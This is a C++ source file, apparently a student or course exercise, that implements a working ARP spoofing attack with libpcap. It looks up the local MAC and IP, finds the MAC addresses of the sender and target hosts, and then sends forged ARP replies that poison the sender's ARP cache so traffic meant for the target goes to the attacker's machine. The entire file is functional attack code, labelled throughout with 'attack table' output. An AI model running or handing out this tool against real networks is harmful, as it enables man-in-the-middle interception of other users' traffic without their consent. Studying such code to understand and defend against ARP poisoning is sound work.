#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/ether.h>
#include <net/if.h>
#include <sys/ioctl.h>

#include <string>

char* dev;
char* attacker_mac;
char* attacker_ip;

struct attack_table{
	char* sender_ip;
	char* sender_mac;
	char* target_ip;
	char* target_mac;	
};

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

using namespace std;

char* get_mac_address() {
    int socket_fd;
    int count_if;

    struct ifreq* t_if_req;
    struct ifconf t_if_conf;

    char* arr_mac_addr = new char[18];
    memset(arr_mac_addr, 0, 18);

    t_if_conf.ifc_ifcu.ifcu_req = NULL;
    t_if_conf.ifc_len = 0;

    if( (socket_fd = socket(PF_INET, SOCK_DGRAM, 0)) < 0 ) {
        return NULL;
    }

    if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) {
        return NULL;
    }

    if( (t_if_req = (ifreq *)malloc(t_if_conf.ifc_len)) == NULL ) {
        close(socket_fd);
        free(t_if_req);
        return NULL;

    } else {
        t_if_conf.ifc_ifcu.ifcu_req = t_if_req;
        if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) {
            close(socket_fd);
            free(t_if_req);
            return NULL;
        }

        count_if = t_if_conf.ifc_len / sizeof(struct ifreq);
        for( int idx = 0; idx < count_if; idx++ ) {
            struct ifreq *req = &t_if_req[idx];

            if( !strcmp(req->ifr_name, "lo") ) {
                continue;
            }

            if( ioctl(socket_fd, SIOCGIFHWADDR, req) < 0 ) {
                break;
            }

            sprintf(arr_mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x",
                    (unsigned char)req->ifr_hwaddr.sa_data[0],
                    (unsigned char)req->ifr_hwaddr.sa_data[1],
                    (unsigned char)req->ifr_hwaddr.sa_data[2],
                    (unsigned char)req->ifr_hwaddr.sa_data[3],
                    (unsigned char)req->ifr_hwaddr.sa_data[4],
                    (unsigned char)req->ifr_hwaddr.sa_data[5]);
            break;
        }
    }

    close(socket_fd);
    free(t_if_req);

    return arr_mac_addr;
}

char* s_getIpAddress(const char* ifr) {
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in* sin;
    static char ip_addr[INET_ADDRSTRLEN];
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, ifr);
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {
        perror("ioctl() SIOCGIFADDR error");
        return NULL;
    }
    sin = (struct sockaddr_in*)&ifrq.ifr_addr;
    const char* ip = inet_ntoa(sin->sin_addr);
    strcpy(ip_addr, ip);

    close(sockfd);

    return ip_addr;
}

void send_arp(const char *dev, int option, const char *destination_mac, const char *source_mac, const char *sender_mac, const char *sender_ip, const char *target_mac, const char *target_ip){
char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
        if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                return;
        }
        EthArpPacket packet;

        packet.eth_.dmac_ = Mac(destination_mac);
        packet.eth_.smac_ = Mac(source_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
	if(option == 1) packet.arp_.op_ = htons(ArpHdr::Request);
	else if(option == 2) packet.arp_.op_ = htons(ArpHdr::Reply);
	else{ 
		printf("enter option 1 or 2\n");
		return;
	}
        packet.arp_.smac_ = Mac(sender_mac);
        packet.arp_.sip_ = htonl(Ip(sender_ip));
        packet.arp_.tmac_ = Mac(target_mac);
        packet.arp_.tip_ = htonl(Ip(target_ip));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        pcap_close(handle);
}


char* get_mac(const char* dev, const char* attacker_mac, const char* attacker_ip, const char* sender_ip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return strdup("error");
    }

    while (true) {
        send_arp(dev, 1, "ff:ff:ff:ff:ff:ff", attacker_mac, attacker_mac, attacker_ip, "00:00:00:00:00:00", sender_ip);
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        struct EthHdr *eth_hdr = (struct EthHdr *) packet;
        struct ArpHdr *arp_hdr = (struct ArpHdr *) (packet+14);

        if (eth_hdr->type() != eth_hdr->Arp) {
            continue; // Not ARP Packet
        }

        uint32_t pcap_sender_ip = uint32_t(arp_hdr->sip());
        uint8_t* pcap_sender_mac = (uint8_t*)(arp_hdr->smac());

        char* pcap_sender_mac_str = (char*)malloc(18 * sizeof(char));
        if (pcap_sender_mac_str) {
            snprintf(pcap_sender_mac_str, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
                    pcap_sender_mac[0], pcap_sender_mac[1], pcap_sender_mac[2],
                    pcap_sender_mac[3], pcap_sender_mac[4], pcap_sender_mac[5]);
        }
	//printf("pcap_sender_mac_str: %s\n",pcap_sender_mac_str);
	//printf("pcap_sender_ip: %x\n", pcap_sender_ip);
        uint32_t pcap_target_ip = uint32_t(arp_hdr->tip());
        uint8_t* pcap_target_mac = (uint8_t*)(arp_hdr->tmac());
        char pcap_target_mac_str[18];
        sprintf(pcap_target_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                pcap_target_mac[0], pcap_target_mac[1], pcap_target_mac[2],
                pcap_target_mac[3], pcap_target_mac[4], pcap_target_mac[5]);

	//printf("pcap_target_mac_str: %s\n", pcap_target_mac_str);
	//printf("pcap_target_ip: %x\n\n", pcap_target_ip);

	if ((pcap_sender_ip == Ip(sender_ip)) && (!strcmp(attacker_mac, pcap_target_mac_str))){
		pcap_close(pcap);
            	return pcap_sender_mac_str;
        } else {
            	free(pcap_sender_mac_str);
        }
    }

    pcap_close(pcap);
    return NULL;
}




int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}
	dev = argv[1];

    	int table_count = (argc - 2) / 2;
    	attack_table* attack_tables = new attack_table[table_count];

	attacker_mac = get_mac_address();
	attacker_ip = s_getIpAddress(dev);

	
    	for (int i = 0; i < table_count; i++) {
		printf("[*] Loading Attack Table...\n");
		
		attack_tables[i].sender_ip = argv[2 + i * 2];
        	attack_tables[i].target_ip = argv[3 + i * 2];
		attack_tables[i].sender_mac = get_mac(dev, attacker_mac, attacker_ip, attack_tables[i].sender_ip);
		attack_tables[i].target_mac = get_mac(dev, attacker_mac, attacker_ip, attack_tables[i].target_ip);

		printf("-------------Attack Table %d info-------------\n",i);
		printf("Attacker Mac Address: %s\n", attacker_mac);
        	printf("Attacker IP Address: %s\n", attacker_ip);
		printf("attack_table[%d].sender_mac: %s\n", i, attack_tables[i].sender_mac);
		printf("attack_table[%d].sender_ip: %s\n",i, attack_tables[i].sender_ip);
    		
		printf("attack_table[%d].target_mac: %s\n", i, attack_tables[i].target_mac);
		printf("attack_table[%d].target_ip: %s\n",i, attack_tables[i].target_ip);
		printf("----------------------------------------------\n");
		printf("\n");
	}

	for (int i = 0; i < table_count; i++){
		send_arp(dev, 2, attack_tables[i].sender_mac, attack_tables[i].target_mac, attacker_mac, attack_tables[i].target_ip, attack_tables[i].sender_mac, attack_tables[i].sender_ip);
		printf("[*] Send ARP Spoof Packet\n");
		printf("-----------------Packet %d info-----------------\n",i);
		printf("Divice: %s\nOpcode: 2\nSource_MAC: %s\nDestination MAC: %s\nSender MAC: %s\nSender IP: %s\nTarget MAC: %s\nTarget IP: %s\n",
				dev,
				attack_tables[i].sender_mac,
				attack_tables[i].target_mac,
				attacker_mac,
				attack_tables[i].target_ip,
				attack_tables[i].sender_mac,
				attack_tables[i].sender_ip
				);
		printf("----------------------------------------------\n");
	}

		

}
